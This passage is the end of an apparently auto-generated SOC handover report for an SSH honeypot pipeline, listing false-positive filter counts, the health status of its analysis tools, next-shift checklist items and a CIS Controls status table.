| AbuseIPDB score 0 below threshold 25 | 2 |
| AbuseIPDB score 14 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 117 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 1001 cases |
| Tool 34  | Credential Extractor        | ✅ 380 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 15 fingerprints |
| Tool 36  | Command Clustering          | ✅ 11 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 93 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 120 filtered (12.0%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 55 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 36 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 345 priority case(s) shown individually · 51 recon entry/entries in table (22 group(s) consolidating 507 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-07-05T07:31:41Z_
